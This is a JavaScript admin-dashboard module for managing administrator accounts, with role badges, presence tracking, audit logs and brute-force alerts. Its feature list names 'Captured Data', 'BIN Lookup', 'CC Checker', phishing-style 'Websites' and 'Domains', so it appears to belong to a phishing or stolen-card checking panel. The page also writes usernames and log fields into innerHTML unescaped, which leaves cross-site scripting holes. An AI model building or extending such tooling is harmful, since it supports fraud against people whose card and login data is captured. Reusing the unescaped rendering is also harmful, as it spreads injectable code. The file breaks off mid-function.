/**
 * Admin Operations Center — god role only
 * Premium dashboard for monitoring and managing all administrator accounts.
 */
const UserManagementPage = (() => {

  const PAGE_FEATURES = [
    { key: 'dashboard',      label: 'Dashboard',      section: 'Monitoring' },
    { key: 'sessions',       label: 'Live Sessions',  section: 'Monitoring' },
    { key: 'demo-pages',     label: 'Websites',       section: 'Control'    },
    { key: 'captured-data',  label: 'Captured Data',  section: 'Control'    },
    { key: 'analytics',      label: 'Analytics',      section: 'Control'    },
    { key: 'domains',        label: 'Domains',        section: 'Control'    },
    { key: 'bin-lookup',     label: 'BIN Lookup',     section: 'Card Tools' },
    { key: 'cc-checker',     label: 'CC Checker',     section: 'Card Tools' },
    { key: 'ip-blocking',    label: 'IP Blocking',    section: 'Security'   },
    { key: 'rate-limits',    label: 'Rate Limits',    section: 'Security'   },
    { key: 'firewall-rules', label: 'Firewall',       section: 'Security'   },
    { key: 'notifications',  label: 'Notifications',  section: 'System'     },
    { key: 'logs',           label: 'Audit Logs',     section: 'System'     },
    { key: 'settings',       label: 'Settings',       section: 'System'     },
  ];

  const ROLE_META = {
    god:         { label: 'God Admin',   cls: 'badge-warning',   icon: '👑', color: '#D4AF37', bg: 'rgba(212,175,55,0.12)', border: 'rgba(212,175,55,0.3)' },
    super_admin: { label: 'Super Admin', cls: 'badge-info',      icon: '⭐', color: 'var(--color-info)', bg: 'var(--color-info-muted)', border: 'rgba(59,130,246,0.3)' },
    admin:       { label: 'Admin',       cls: 'badge-success',   icon: '🔧', color: 'var(--color-success)', bg: 'var(--color-success-muted)', border: 'rgba(34,197,94,0.3)' },
    viewer:      { label: 'Viewer',      cls: 'badge-secondary', icon: '👁',  color: 'var(--text-secondary)', bg: 'rgba(150,150,150,0.1)', border: 'rgba(150,150,150,0.2)' },
  };

  // ── State ─────────────────────────────────────────────────────────────────

  let _users = [];
  let _stats = null;
  let _onlineIds = new Set();
  let _filterRole = 'all';
  let _filterStatus = 'all';
  let _searchQuery = '';
  let _sortBy = 'last_login';
  let _drawerUserId = null;
  let _drawerTab = 'overview';
  let _refreshTimer = null;
  let _presenceUnsub = null;

  // ── Render ────────────────────────────────────────────────────────────────

  function render() {
    return `
      <style>
        .um-stats-grid { display:grid; grid-template-columns:repeat(5,1fr); gap:14px; margin-bottom:20px; }
        @media(max-width:1100px){ .um-stats-grid { grid-template-columns:repeat(3,1fr); } }
        @media(max-width:700px) { .um-stats-grid { grid-template-columns:repeat(2,1fr); } }
        .um-stat-card { background:var(--bg-secondary); border:1px solid var(--border-primary); border-radius:var(--radius-xl); padding:18px 20px; display:flex; align-items:center; gap:14px; transition:all var(--transition-base); cursor:default; }
        .um-stat-card:hover { border-color:var(--border-hover); transform:translateY(-1px); box-shadow:var(--shadow-md); }
        .um-stat-icon { width:44px; height:44px; border-radius:var(--radius-lg); display:flex; align-items:center; justify-content:center; font-size:20px; flex-shrink:0; }
        .um-stat-val { font-size:26px; font-weight:800; line-height:1; color:var(--text-primary); }
        .um-stat-lbl { font-size:11px; color:var(--text-secondary); font-weight:600; text-transform:uppercase; letter-spacing:.5px; margin-top:3px; }

        .um-toolbar { display:flex; align-items:center; gap:10px; margin-bottom:16px; flex-wrap:wrap; }
        .um-search-wrap { position:relative; flex:1; min-width:200px; }
        .um-search-wrap svg { position:absolute; left:11px; top:50%; transform:translateY(-50%); color:var(--text-secondary); pointer-events:none; }
        .um-search-input { width:100%; background:var(--bg-input); border:1px solid var(--border-primary); border-radius:var(--radius-md); padding:8px 12px 8px 34px; color:var(--text-primary); font-size:13px; outline:none; transition:border-color var(--transition-fast); }
        .um-search-input:focus { border-color:var(--accent-primary); }
        .um-select { background:var(--bg-input); border:1px solid var(--border-primary); border-radius:var(--radius-md); padding:8px 12px; color:var(--text-primary); font-size:13px; cursor:pointer; outline:none; }

        .um-table { width:100%; border-collapse:collapse; }
        .um-table th { padding:10px 14px; text-align:left; font-size:10px; font-weight:700; color:var(--text-secondary); text-transform:uppercase; letter-spacing:.6px; border-bottom:1px solid var(--border-primary); white-space:nowrap; }
        .um-table td { padding:12px 14px; border-bottom:1px solid var(--border-primary); vertical-align:middle; }
        .um-table tbody tr { transition:background var(--transition-fast); cursor:pointer; }
        .um-table tbody tr:hover { background:var(--bg-hover); }
        .um-table tbody tr:last-child td { border-bottom:none; }

        .um-online-dot { width:8px; height:8px; border-radius:50%; display:inline-block; flex-shrink:0; transition:background var(--transition-normal); }
        .um-online-dot.online  { background:var(--color-success); box-shadow:0 0 6px var(--color-success); }
        .um-online-dot.offline { background:var(--text-muted); }

        .um-role-badge { display:inline-flex; align-items:center; gap:5px; padding:3px 9px; border-radius:var(--radius-pill); font-size:11px; font-weight:700; border:1px solid; white-space:nowrap; }
        .um-suspended-tag { display:inline-flex; align-items:center; gap:4px; padding:2px 7px; border-radius:var(--radius-pill); font-size:10px; font-weight:700; color:var(--color-danger); background:var(--color-danger-muted); border:1px solid rgba(239,68,68,.3); margin-left:6px; }

        .um-action-btn { display:inline-flex; align-items:center; gap:5px; padding:5px 10px; border-radius:var(--radius-md); font-size:12px; font-weight:600; border:1px solid var(--border-primary); background:transparent; color:var(--text-secondary); cursor:pointer; transition:all var(--transition-fast); }
        .um-action-btn:hover { background:var(--bg-hover); color:var(--text-primary); border-color:var(--border-hover); }
        .um-action-btn.danger:hover { background:var(--color-danger-muted); color:var(--color-danger); border-color:rgba(239,68,68,.3); }
        .um-action-btn.gold { color:var(--accent-primary); border-color:rgba(212,175,55,.3); }
        .um-action-btn.gold:hover { background:var(--accent-primary-muted); border-color:rgba(212,175,55,.5); }

        .um-bottom-grid { display:grid; grid-template-columns:1fr 1fr; gap:16px; margin-top:20px; }
        @media(max-width:800px){ .um-bottom-grid { grid-template-columns:1fr; } }
        .um-section-title { font-size:12px; font-weight:700; color:var(--text-secondary); text-transform:uppercase; letter-spacing:.6px; margin-bottom:14px; display:flex; align-items:center; gap:8px; }

        .um-log-item { display:flex; align-items:flex-start; gap:10px; padding:10px 0; border-bottom:1px solid var(--border-primary); }
        .um-log-item:last-child { border-bottom:none; }
        .um-log-icon { width:28px; height:28px; border-radius:var(--radius-sm); background:var(--bg-tertiary); display:flex; align-items:center; justify-content:center; font-size:13px; flex-shrink:0; margin-top:1px; }
        .um-alert-item { display:flex; align-items:center; gap:10px; padding:10px 12px; background:var(--color-danger-muted); border:1px solid rgba(239,68,68,.2); border-radius:var(--radius-md); margin-bottom:8px; }

        /* Profile Drawer */
        #um-drawer-overlay { position:fixed; inset:0; background:rgba(0,0,0,.6); z-index:var(--z-overlay); display:none; backdrop-filter:blur(2px); }
        #um-drawer-panel { position:fixed; top:0; right:0; width:420px; height:100vh; background:var(--bg-secondary); border-left:1px solid var(--border-primary); z-index:calc(var(--z-overlay)+1); display:flex; flex-direction:column; overflow:hidden; transform:translateX(100%); transition:transform var(--duration-slow) var(--ease-out); box-shadow:var(--shadow-xl); }
        #um-drawer-panel.open { transform:translateX(0); }
        @media(max-width:500px){ #um-drawer-panel { width:100%; } }
        .um-drawer-header { padding:20px; border-bottom:1px solid var(--border-primary); display:flex; align-items:center; justify-content:space-between; flex-shrink:0; }
        .um-drawer-body { flex:1; overflow-y:auto; padding:20px; }
        .um-drawer-tabs { display:flex; gap:4px; margin-bottom:20px; background:var(--bg-tertiary); border-radius:var(--radius-md); padding:3px; }
        .um-drawer-tab { flex:1; padding:7px 12px; border-radius:var(--radius-sm); font-size:12px; font-weight:600; text-align:center; cursor:pointer; color:var(--text-secondary); transition:all var(--transition-fast); border:none; background:transparent; }
        .um-drawer-tab.active { background:var(--bg-secondary); color:var(--text-primary); box-shadow:var(--shadow-sm); }
        .um-drawer-footer { padding:16px 20px; border-top:1px solid var(--border-primary); display:flex; gap:8px; flex-shrink:0; }

        .um-history-row { display:flex; align-items:center; gap:10px; padding:10px 0; border-bottom:1px solid var(--border-primary); font-size:12px; }
        .um-history-row:last-child { border-bottom:none; }
        .um-perm-section { margin-bottom:14px; }
        .um-perm-section-title { font-size:10px; font-weight:700; color:var(--text-secondary); text-transform:uppercase; letter-spacing:.6px; margin-bottom:8px; }
        .um-perm-chips { display:flex; flex-wrap:wrap; gap:6px; }
        .um-perm-chip { display:flex; align-items:center; gap:5px; padding:5px 9px; border-radius:var(--radius-sm); border:1px solid var(--border-primary); background:var(--bg-tertiary); font-size:12px; cursor:pointer; transition:all var(--transition-fast); }
        .um-perm-chip.blocked { opacity:.45; }
        .um-info-row { display:flex; align-items:center; justify-content:space-between; padding:9px 0; border-bottom:1px solid var(--border-primary); font-size:13px; }
        .um-info-row:last-child { border-bottom:none; }
        .um-info-label { color:var(--text-secondary); font-size:12px; }
      </style>

      <div style="display:flex;align-items:flex-start;justify-content:space-between;margin-bottom:20px;flex-wrap:wrap;gap:12px;">
        <div>
          <h1 style="font-size:22px;font-weight:800;margin:0;display:flex;align-items:center;gap:10px;">
            Admin Operations Center
            <span id="um-live-badge" style="font-size:11px;font-weight:600;padding:3px 8px;border-radius:var(--radius-pill);background:var(--color-success-muted);color:var(--color-success);border:1px solid rgba(34,197,94,.3);display:none;">
              ● Live
            </span>
          </h1>
          <p style="color:var(--text-secondary);font-size:13px;margin:4px 0 0;">Monitor and manage all administrator accounts. Real-time presence tracking and audit log.</p>
        </div>
        <div style="display:flex;gap:8px;">
          <button class="btn btn-ghost" id="um-refresh-btn" title="Refresh" style="padding:8px 12px;">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 11-2.12-9.36L23 10"/></svg>
          </button>
          <button class="btn btn-primary" id="um-add-btn" style="display:flex;align-items:center;gap:7px;">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg>
            New Admin
          </button>
        </div>
      </div>

      <!-- Stats cards -->
      <div class="um-stats-grid" id="um-stats">
        ${[0,1,2,3,4].map(i => `
          <div class="um-stat-card">
            <div class="um-stat-icon" style="background:var(--bg-tertiary);">
              <div class="spinner" style="width:18px;height:18px;border-width:2px;"></div>
            </div>
            <div><div class="um-stat-val" style="color:var(--text-muted);">—</div><div class="um-stat-lbl">Loading</div></div>
          </div>
        `).join('')}
      </div>

      <!-- Toolbar -->
      <div class="um-toolbar">
        <div class="um-search-wrap">
          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
          <input class="um-search-input" id="um-search" placeholder="Search by name or email…" autocomplete="off">
        </div>
        <select class="um-select" id="um-filter-role" title="Filter by role">
          <option value="all">All Roles</option>
          <option value="god">👑 God Admin</option>
          <option value="super_admin">⭐ Super Admin</option>
          <option value="admin">🔧 Admin</option>
          <option value="viewer">👁 Viewer</option>
        </select>
        <select class="um-select" id="um-filter-status" title="Filter by status">
          <option value="all">All Status</option>
          <option value="online">Online</option>
          <option value="offline">Offline</option>
          <option value="suspended">Suspended</option>
        </select>
        <select class="um-select" id="um-sort-by" title="Sort by">
          <option value="last_login">Last Login</option>
          <option value="name">Name A–Z</option>
          <option value="role">Role</option>
          <option value="status">Status</option>
        </select>
      </div>

      <!-- Users table -->
      <div class="card" style="padding:0;overflow:hidden;">
        <div id="um-table-wrap">
          <div style="padding:48px;text-align:center;color:var(--text-secondary);">
            <div class="spinner" style="margin:0 auto 12px;"></div>Loading accounts…
          </div>
        </div>
      </div>

      <!-- Bottom: Audit feed + Security alerts -->
      <div class="um-bottom-grid">
        <div class="card" style="padding:20px;">
          <div class="um-section-title">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>
            Recent Audit Log
            <a href="#/logs?category=auth" style="margin-left:auto;font-size:11px;color:var(--accent-primary);text-decoration:none;text-transform:none;letter-spacing:0;font-weight:600;">View All →</a>
          </div>
          <div id="um-audit-feed">
            <div style="text-align:center;color:var(--text-secondary);padding:24px;font-size:13px;">Loading…</div>
          </div>
        </div>
        <div class="card" style="padding:20px;">
          <div class="um-section-title">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
            Security Alerts
            <span id="um-alert-badge" style="display:none;background:var(--color-danger);color:#fff;font-size:10px;font-weight:700;padding:2px 6px;border-radius:var(--radius-pill);">0</span>
          </div>
          <div id="um-alerts-wrap">
            <div style="text-align:center;color:var(--text-secondary);padding:24px;font-size:13px;">Loading…</div>
          </div>
        </div>
      </div>

      <!-- Profile Drawer (outside page flow) -->
      <div id="um-drawer-overlay"></div>
      <div id="um-drawer-panel">
        <div class="um-drawer-header">
          <span style="font-size:14px;font-weight:700;color:var(--text-primary);">Admin Profile</span>
          <button class="btn btn-ghost btn-sm" id="um-drawer-close" style="padding:6px;">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
          </button>
        </div>
        <div class="um-drawer-body" id="um-drawer-content">
          <div style="text-align:center;padding:40px;color:var(--text-secondary);font-size:13px;">Select a user to view their profile.</div>
        </div>
        <div class="um-drawer-footer" id="um-drawer-footer" style="display:none;"></div>
      </div>
    `;
  }

  // ── Init ──────────────────────────────────────────────────────────────────

  async function init() {
    document.getElementById('um-add-btn').addEventListener('click', openCreateModal);
    document.getElementById('um-refresh-btn').addEventListener('click', () => loadAll());
    document.getElementById('um-search').addEventListener('input', _debounce(e => { _searchQuery = e.target.value.trim(); renderTable(); }, 250));
    document.getElementById('um-filter-role').addEventListener('change', e => { _filterRole = e.target.value; renderTable(); });
    document.getElementById('um-filter-status').addEventListener('change', e => { _filterStatus = e.target.value; renderTable(); });
    document.getElementById('um-sort-by').addEventListener('change', e => { _sortBy = e.target.value; renderTable(); });
    document.getElementById('um-drawer-overlay').addEventListener('click', closeDrawer);
    document.getElementById('um-drawer-close').addEventListener('click', closeDrawer);

    // Socket presence
    if (window.ALPSocket) {
      _presenceUnsub = (online) => {
        _onlineIds = new Set(online.map(u => u.userId));
        _updateOnlineDots();
        _refreshStatOnlineCount();
      };
      window.ALPSocket.on('admin:presence', _presenceUnsub);
      document.getElementById('um-live-badge').style.display = 'inline-flex';
    }

    // Listen for forced session termination from another god
    if (window.ALPSocket) {
      window.ALPSocket.on('admin:session-terminated', (data) => {
        window.showToast(data?.message || 'Your session was terminated by an administrator.', 'error');
        setTimeout(() => { if (window.ALPAuth) window.ALPAuth.logout(); }, 2000);
      });
    }

    await loadAll();
    _refreshTimer = setInterval(() => loadAll(false), 30000);
  }

  // ── Data Loading ──────────────────────────────────────────────────────────

  async function loadAll(showSpinner = true) {
    try {
      const [usersRes, statsRes] = await Promise.all([
        window.ALPApi.godGetUsers(),
        window.ALPApi.godGetStats().catch(() => null),
      ]);

      _users = usersRes.users || [];
      _stats = statsRes;

      if (statsRes) {
        _onlineIds = new Set(statsRes.onlineIds || []);
      } else {
        try {
          const pRes = await window.ALPApi.godGetPresence();
          _onlineIds = new Set((pRes.online || []).map(u => u.userId));
        } catch {}
      }

      renderStats();
      renderTable();
      await Promise.all([renderAuditFeed(), renderAlerts()]);
    } catch (err) {
      document.getElementById('um-table-wrap').innerHTML =
        `<div style="padding:32px;text-align:center;color:var(--color-danger);">Failed to load: ${err.message}</div>`;
    }
  }

  // ── Stats Cards ───────────────────────────────────────────────────────────

  function renderStats() {
    const s = _stats || {};
    const byRole = s.byRole || {};
    const total = s.total ?? _users.length;
    const online = _onlineIds.size;
    const sessions = s.activeSessions ?? 0;
    const logins24h = s.recentLogins ?? 0;
    const failed24h = s.failedLogins ?? 0;

    const cards = [
      { icon: '👥', color: 'var(--color-info)',    bg: 'var(--color-info-muted)',    val: total,     lbl: 'Total Admins',     sub: _buildRoleSummary(byRole) },
      { icon: '🟢', color: 'var(--color-success)', bg: 'var(--color-success-muted)', val: online,    lbl: 'Online Now',       sub: online === 1 ? '1 session active' : `${online} sessions active` },
      { icon: '🔐', color: 'var(--accent-primary)', bg: 'var(--accent-primary-muted)', val: sessions, lbl: 'Active Sessions',  sub: 'stored session tokens' },
      { icon: '📊', color: 'var(--color-info)',    bg: 'var(--color-info-muted)',    val: logins24h, lbl: 'Logins (24h)',     sub: 'successful sign-ins' },
      { icon: '⚠️', color: failed24h > 0 ? 'var(--color-danger)' : 'var(--text-secondary)', bg: failed24h > 0 ? 'var(--color-danger-muted)' : 'var(--bg-tertiary)', val: failed24h, lbl: 'Failed (24h)', sub: 'failed login attempts' },
    ];

    document.getElementById('um-stats').innerHTML = cards.map(c => `
      <div class="um-stat-card">
        <div class="um-stat-icon" style="background:${c.bg};font-size:18px;">${c.icon}</div>
        <div>
          <div class="um-stat-val" style="color:${c.color};">${c.val}</div>
          <div class="um-stat-lbl">${c.lbl}</div>
          <div style="font-size:10px;color:var(--text-muted);margin-top:2px;">${c.sub}</div>
        </div>
      </div>
    `).join('');
  }

  function _buildRoleSummary(byRole) {
    const parts = [];
    if (byRole.god)         parts.push(`${byRole.god} god`);
    if (byRole.super_admin) parts.push(`${byRole.super_admin} super`);
    if (byRole.admin)       parts.push(`${byRole.admin} admin`);
    if (byRole.viewer)      parts.push(`${byRole.viewer} viewer`);
    return parts.join(' · ') || 'no users';
  }

  function _refreshStatOnlineCount() {
    const el = document.querySelector('#um-stats .um-stat-card:nth-child(2) .um-stat-val');
    if (el) el.textContent = _onlineIds.size;
  }

  // ── User Table ────────────────────────────────────────────────────────────

  function _getFilteredUsers() {
    let list = [..._users];
    const q = _searchQuery.toLowerCase();
    if (q) list = list.filter(u => (u.username || '').toLowerCase().includes(q) || (u.email || '').toLowerCase().includes(q));
    if (_filterRole !== 'all') list = list.filter(u => u.role === _filterRole);
    if (_filterStatus === 'online')    list = list.filter(u => _onlineIds.has(u.id));
    if (_filterStatus === 'offline')   list = list.filter(u => !_onlineIds.has(u.id));
    if (_filterStatus === 'suspended') list = list.filter(u => _isSuspended(u));

    const roleOrder = { god: 0, super_admin: 1, admin: 2, viewer: 3 };
    list.sort((a, b) => {
      if (_sortBy === 'name')      return (a.username || '').localeCompare(b.username || '');
      if (_sortBy === 'role')      return (roleOrder[a.role] ?? 9) - (roleOrder[b.role] ?? 9);
      if (_sortBy === 'status')    return (_onlineIds.has(b.id) ? 1 : 0) - (_onlineIds.has(a.id) ? 1 : 0);
      // default: last_login desc
      return new Date(b.last_login || 0) - new Date(a.last_login || 0);
    });
    return list;
  }

  function _isSuspended(u) {
    const p = u.permissions || {};
    return !!(typeof p === 'object' ? p.suspended : false);
  }

  function renderTable() {
    const me = window.ALPAuth.getUser();
    const list = _getFilteredUsers();

    if (!list.length) {
      document.getElementById('um-table-wrap').innerHTML = `
        <div style="padding:48px;text-align:center;color:var(--text-secondary);">
          <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" style="margin:0 auto 10px;display:block;opacity:.4;"><path d="M17 21v-2a4 4 0 00-4-4H5a4 4 0 00-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 00-3-3.87"/><path d="M16 3.13a4 4 0 010 7.75"/></svg>
          No accounts match the current filters.
        </div>`;
      return;
    }

    const rows = list.map(u => {
      const rm = ROLE_META[u.role] || ROLE_META.viewer;
      const isSelf = u.id == me?.userId;
      const isGodUser = u.role === 'god';
      const isOnline = _onlineIds.has(u.id);
      const suspended = _isSuspended(u);
      const lastLoginText = u.last_login ? _relTime(u.last_login) : 'Never';
      const permsPages = (u.permissions && u.permissions.pages) || {};
      const blockedCount = PAGE_FEATURES.filter(f => permsPages[f.key] === false).length;
      const accessText = isGodUser ? 'Full access' : blockedCount === 0 ? `All ${PAGE_FEATURES.length} pages` : `${PAGE_FEATURES.length - blockedCount}/${PAGE_FEATURES.length} pages`;
      const avatar = `<div style="width:36px;height:36px;border-radius:50%;background:${u.avatar_color||'#6366f1'};display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:700;color:#fff;flex-shrink:0;position:relative;">${(u.username||'?')[0].toUpperCase()}
        <span class="um-online-dot ${isOnline?'online':'offline'}" data-user-online-id="${u.id}" style="position:absolute;bottom:0;right:0;width:9px;height:9px;box-shadow:0 0 0 2px var(--bg-secondary);"></span>
      </div>`;

      const actionBtns = isGodUser ? `<span style="font-size:11px;color:var(--text-muted);">Protected</span>` : `
        <button class="um-action-btn gold" onclick="event.stopPropagation();UserManagementPage._openEdit(${u.id})" title="Edit">
          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M11 4H4a2 2 0 00-2 2v14a2 2 0 002 2h14a2 2 0 002-2v-7"/><path d="M18.5 2.5a2.121 2.121 0 013 3L12 15l-4 1 1-4 9.5-9.5z"/></svg>
          Edit
        </button>
        ${!isSelf ? `
          <button class="um-action-btn ${suspended?'':'danger'}" onclick="event.stopPropagation();UserManagementPage._toggleSuspend(${u.id})" title="${suspended?'Activate':'Suspend'}">
            ${suspended
              ? `<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg>Activate`
              : `<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="4.93" y1="4.93" x2="19.07" y2="19.07"/></svg>Suspend`}
          </button>
          <button class="um-action-btn danger" onclick="event.stopPropagation();UserManagementPage._confirmDelete(${u.id})" title="Delete">
            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14a2 2 0 01-2 2H8a2 2 0 01-2-2L5 6"/></svg>
            Delete
          </button>
        ` : ''}
      `;

      return `
        <tr data-user-id="${u.id}" onclick="UserManagementPage._openDrawer(${u.id})" title="View profile">
          <td>
            <div style="display:flex;align-items:center;gap:10px;">
              ${avatar}
              <div>
                <div style="font-weight:600;font-size:13px;display:flex;align-items:center;gap:6px;">
                  ${u.username}${isSelf ? '<span style="font-size:10px;color:var(--text-muted);">(you)</span>' : ''}
                  ${suspended ? '<span class="um-suspended-tag">⛔ Suspended</span>' : ''}
                </div>
                <div style="font-size:11px;color:var(--text-secondary);">${u.email}</div>
              </div>
            </div>
          </td>
          <td>
            <span class="um-role-badge" style="color:${rm.color};background:${rm.bg};border-color:${rm.border};">${rm.icon} ${rm.label}</span>
          </td>
          <td>
            <div style="display:flex;align-items:center;gap:6px;">
              <span class="um-online-dot ${isOnline?'online':'offline'}" data-user-online-id="${u.id}"></span>
              <span data-user-status-id="${u.id}" style="font-size:12px;color:${isOnline?'var(--color-success)':'var(--text-secondary)'};">
                ${isOnline ? 'Online' : lastLoginText}
              </span>
            </div>
          </td>
          <td style="font-size:12px;color:var(--text-secondary);">${lastLoginText}</td>
          <td style="font-size:12px;color:var(--text-secondary);">${accessText}</td>
          <td style="font-size:12px;color:var(--text-secondary);" onclick="event.stopPropagation();">
            <div style="display:flex;align-items:center;gap:6px;justify-content:flex-end;">
              ${actionBtns}
            </div>
          </td>
        </tr>`;
    }).join('');

    document.getElementById('um-table-wrap').innerHTML = `
      <table class="um-table">
        <thead>
          <tr>
            <th>User</th>
            <th>Role</th>
            <th>Status</th>
            <th>Last Login</th>
            <th>Page Access</th>
            <th style="text-align:right;">Actions</th>
          </tr>
        </thead>
        <tbody>${rows}</tbody>
      </table>
    `;
  }

  function _updateOnlineDots() {
    document.querySelectorAll('[data-user-online-id]').forEach(el => {
      const id = parseInt(el.dataset.userOnlineId);
      const on = _onlineIds.has(id);
      el.className = `um-online-dot ${on ? 'online' : 'offline'}`;
    });
    document.querySelectorAll('[data-user-status-id]').forEach(el => {
      const id = parseInt(el.dataset.userStatusId);
      const on = _onlineIds.has(id);
      el.style.color = on ? 'var(--color-success)' : 'var(--text-secondary)';
      if (on) el.textContent = 'Online';
      else {
        const u = _users.find(x => x.id === id);
        el.textContent = u?.last_login ? _relTime(u.last_login) : 'Offline';
      }
    });
  }

  // ── Audit Feed ────────────────────────────────────────────────────────────

  async function renderAuditFeed() {
    try {
      const { logs } = await window.ALPApi.getLogs({ category: 'auth', limit: 10 });
      const el = document.getElementById('um-audit-feed');
      if (!el) return;
      if (!logs || !logs.length) {
        el.innerHTML = '<div style="text-align:center;color:var(--text-secondary);padding:20px;font-size:13px;">No recent activity.</div>';
        return;
      }
      el.innerHTML = logs.map(log => {
        const isSuccess = log.action === 'User logged in';
        const isFailed = log.action === 'Login failed';
        const icon = isSuccess ? '✅' : isFailed ? '❌' : '🔧';
        return `
          <div class="um-log-item">
            <div class="um-log-icon">${icon}</div>
            <div style="flex:1;min-width:0;">
              <div style="font-size:12px;font-weight:600;color:var(--text-primary);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;">
                <span style="color:var(--accent-primary);">${log.username}</span> — ${log.action}
              </div>
              <div style="font-size:11px;color:var(--text-secondary);margin-top:2px;display:flex;align-items:center;gap:8px;">
                <span>${_relTime(log.timestamp)}</span>
                ${log.ip_address ? `<span>· ${log.ip_address}</span>` : ''}
                ${log.details?.browser ? `<span>· ${log.details.browser}</span>` : ''}
                ${log.details?.country ? `<span>· ${log.details.country}</span>` : ''}
              </div>
            </div>
          </div>`;
      }).join('');
    } catch (err) {
      const el = document.getElementById('um-audit-feed');
      if (el) el.innerHTML = `<div style="color:var(--color-danger);font-size:12px;padding:8px;">Failed to load audit feed.</div>`;
    }
  }

  // ── Security Alerts ───────────────────────────────────────────────────────

  async function renderAlerts() {
    try {
      const { logs } = await window.ALPApi.getLogs({ action: 'Login failed', limit: 50 });
      const el = document.getElementById('um-alerts-wrap');
      const badge = document.getElementById('um-alert-badge');
      if (!el) return;

      // Group by IP for suspicious patterns (≥3 failures from same IP)
      const last24h = Date.now() - 86400000;
      const recent = (logs || []).filter(l => new Date(l.timestamp).getTime() > last24h);
      const byIp = {};
      recent.forEach(l => { byIp[l.ip_address] = (byIp[l.ip_address] || []).concat(l); });
      const suspicious = Object.entries(byIp).filter(([, arr]) => arr.length >= 3);

      if (badge) {
        if (recent.length > 0) { badge.textContent = recent.length; badge.style.display = 'inline-flex'; }
        else badge.style.display = 'none';
      }

      if (!recent.length) {
        el.innerHTML = `
          <div style="display:flex;flex-direction:column;align-items:center;justify-content:center;padding:24px;color:var(--color-success);gap:8px;">
            <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
            <span style="font-size:12px;color:var(--text-secondary);">No security alerts in the last 24 hours.</span>
          </div>`;
        return;
      }

      const rows = [];
      if (suspicious.length) {
        rows.push(`<div style="font-size:11px;font-weight:700;color:var(--color-danger);text-transform:uppercase;letter-spacing:.5px;margin-bottom:8px;">⚠️ Brute Force Attempts</div>`);
        suspicious.forEach(([ip, attempts]) => {
          rows.push(`
            <div class="um-alert-item">
              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="var(--color-danger)" stroke-width="2"><path d="M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
              <div style="flex:1;">
                <div style="font-size:12px;font-weight:600;color:var(--text-primary);">${attempts.length} failed attempts from ${ip}</div>
                <div style="font-size:11px;color:var(--text-secondary);">Targeting: ${[...new Set(attempts.map(a=>a.username))].join(', ')} · Last: ${_relTime(attempts[0].timestamp)}</div>
              </div>
            </div>`);
        });
      }

      if (recent.length && !suspicious.length) {
        rows.push(`<div style="font-size:12px;color:var(--text-secondary);">${recent.length} failed login attempt${recent.length > 1 ? 's' : ''} in the last 24 hours.</div>`);
        recent.slice(0, 5).forEach(l => {
          rows.push(`
            <div class="um-log-item">
              <div class="um-log-icon">❌</div>
              <div style="flex:1;">
                <div style="font-size:12px;font-weight:600;"><span style="color:var(--color-danger);">${l.username}</span> — Login failed</div>
                <div style="font-size:11px;color:var(--text-secondary);">${_relTime(l.timestamp)} · ${l.ip_address}</div>
              </div>
            </div>`);
        });
      }

      el.innerHTML = rows.join('');
    } catch (err) {
      const el = document.getElementById('um-alerts-wrap');
      if (el) el.innerHTML = `<div style="color:var(--color-danger);font-size:12px;padding:8px;">Failed to load security alerts.</div>`;
    }
  }

  // ── Profile Drawer ────────────────────────────────────────────────────────

  function _openDrawer(userId) {
    _drawerUserId = userId;
    _drawerTab = 'overview';
    const overlay = document.getElementById('um-drawer-overlay');
    const panel = document.getElementById('um-drawer-panel');
    overlay.style.display = 'block';
    panel.classList.add('open');
    _renderDrawer();
  }

  function closeDrawer() {
    _drawerUserId = null;
    const overlay = document.getElementById('um-drawer-overlay');
    const panel = document.getElementById('um-drawer-panel');
    if (overlay) overlay.style.display = 'none';
    if (panel) panel.classList.remove('open');
  }

  function _renderDrawer() {
    const user = _users.find(u => u.id === _drawerUserId);
    if (!user) { closeDrawer(); return; }

    const rm = ROLE_META[user.role] || ROLE_META.viewer;
    const isOnline = _onlineIds.has(user.id);
    const suspended = _isSuspended(user);
